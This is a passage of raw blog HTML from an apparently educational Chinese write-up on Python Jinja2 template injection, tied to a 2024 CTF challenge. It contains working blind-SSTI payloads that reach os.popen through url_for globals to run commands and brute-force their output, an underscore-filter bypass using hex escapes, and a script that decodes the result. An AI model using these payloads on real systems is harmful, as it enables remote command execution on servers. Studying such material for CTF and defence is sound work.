+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">set&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;o&amp;#39;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s1">&amp;#39;s&amp;#39;&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">set&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;po&amp;#39;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s1">&amp;#39;pen&amp;#39;&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">set&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">res&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">url_for&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;__globals__&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">](&lt;/span>&lt;span class="s1">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">res&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="n">allchar&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sleep&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="n">endif&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 绕过下划线&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">set&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">allchar&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;abcdefghijklmnopqrstuvwxyz0123456789!@#$%^%26*()-_+&lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">[]|:;?/&amp;gt;&amp;lt;.,ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#34;&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">set&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;o&amp;#39;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s1">&amp;#39;s&amp;#39;&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">set&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;po&amp;#39;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s1">&amp;#39;pen&amp;#39;&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">set&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">res&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">url_for&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\x5f\x5f&lt;/span>&lt;span class="s1">globals&lt;/span>&lt;span class="se">\x5f\x5f&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">](&lt;/span>&lt;span class="s1">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">res&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="n">allchar&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sleep&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="n">endif&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 简单解释一下，该payload首先把所有字符都放在了一个字符串中，便于爆破，然后定义了os和popen字符串，在通过url_for这个内置方法执行命令，并把结果存入到res中。最后通过if去爆破字符串，当相同时程序正常执行，当不同时程序出现异常报错，从而达到猜出字符串的目的。&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218151642759.png"
+width="1115"
+height="112"
+srcset="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218151642759_hu12051511189097481460.png 480w, https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218151642759_hu8800797045157189003.png 1024w"
+loading="lazy"
+alt="image-20241218151642759"
+class="gallery-image"
+data-flex-grow="995"
+data-flex-basis="2389px"
+>&lt;/p>
+&lt;p>​ 得到爆破后的结果，用脚本处理一下。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">x&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;amp;*()-_+&lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s1">[]|:;?/&amp;gt;&amp;lt;.,ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">read_and_process_data&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">file_path&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">extracted_data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">with&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">file_path&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">mode&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;r&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">encoding&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">line&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">parts&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">line&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">strip&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">parts&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;gt;=&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">second_col&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">parts&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">third_col&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">parts&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">extracted_data&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">second_col&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">third_col&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sorted_data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">sorted&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">extracted_data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">lambda&lt;/span> &lt;span class="n">x&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">#print(sorted_data)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">sorted_data&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">write_to_file&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ascii_data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">output_file&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">with&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">output_file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">mode&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;w&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">encoding&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">file&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ascii_data&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">input_file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;data.txt&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">#output_file = &amp;#39;res.txt&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sorted_data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">read_and_process_data&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">input_file&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sorted_data&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">_i&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">k&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">sorted_data&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">k&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="n">end&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ &lt;img src="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218151757183.png"
+width="418"
+height="72"
+srcset="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218151757183_hu13148369488107686646.png 480w, https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218151757183_hu1972031543859971801.png 1024w"
+loading="lazy"
+alt="image-20241218151757183"
+class="gallery-image"
+data-flex-grow="580"
+data-flex-basis="1393px"
+>&lt;/p>
+&lt;h4 id="钩子函数回显">钩子函数回显
+&lt;/h4>&lt;p>这里给出一个简单示例：&lt;/p>
+&lt;h5 id="原题2024国城杯网络安全挑战大赛-ez_gallery">原题：2024“国城杯”网络安全挑战大赛-Ez_Gallery
+&lt;/h5>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">shell_view&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">request&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">expression&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">GET&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;shellcmd&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">blacklist_patterns&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="sa">r&lt;/span>&lt;span class="s1">&amp;#39;.*length.*&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="sa">r&lt;/span>&lt;span class="s1">&amp;#39;.*count.*&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="sa">r&lt;/span>&lt;span class="s1">&amp;#39;.*[0-9].*&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="sa">r&lt;/span>&lt;span class="s1">&amp;#39;.*\..*&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="sa">r&lt;/span>&lt;span class="s1">&amp;#39;.*soft.*&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="sa">r&lt;/span>&lt;span class="s1">&amp;#39;.*%.*&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="nb">any&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">re&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">search&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pattern&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">expression&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">pattern&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">blacklist_patterns&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">Response&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;wafwafwaf&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">jinja2&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Environment&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">loader&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">jinja2&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">BaseLoader&lt;/span>&lt;span class="p">())&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">from_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">expression&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">render&lt;/span>&lt;span class="p">({&lt;/span>&lt;span class="s2">&amp;#34;request&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="p">})&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">result&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">Response&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;success&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">Response&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;error&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">except&lt;/span> &lt;span class="ne">Exception&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">:&lt;/span>
